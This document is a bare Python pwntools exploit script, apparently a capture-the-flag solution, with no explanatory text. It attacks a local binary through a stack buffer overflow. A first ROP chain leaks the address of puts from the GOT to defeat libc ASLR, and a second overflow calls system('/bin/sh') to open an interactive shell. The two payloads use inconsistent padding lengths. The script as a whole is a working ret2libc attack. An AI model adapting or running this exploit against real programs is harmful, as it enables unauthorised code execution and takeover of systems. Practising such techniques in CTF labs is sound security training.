from pwn import *
context(arch="amd64",os="linux",log_level="debug",terminal=["tmux","splitw","-h"])

p =process("./pwn")
#gdb.attach(p,"b *0x4006b8")
elf = ELF("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
pop_rdi_ret = 0x0000000000400763 
elf_got =elf.got["puts"]
elf_plt = elf.plt["puts"]
main_addr = 0x4006b8#elf.symbols["main"]

payload="A"*(0x40+8)+p64(pop_rdi_ret)+p64(elf_got)+p64(elf_plt)+p64(main_addr)
payload=payload.ljust(200,"A")
p.sendline(payload)
xx =p.recvuntil('\x7f\x0a')[5:-1]+'\x00\x00'
puts_leak=u64(xx)
print(hex(puts_leak))
libc.address=puts_leak-libc.symbols["puts"]
system_addr = libc.symbols["system"]
bin_sh_addr = libc.search("/bin/sh").next()
print(hex(system_addr),hex(bin_sh_addr))

payload="A"*(0x40+7)+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(system_addr)
payload=payload.ljust(200,"A")


p.sendline(payload)
p.interactive()
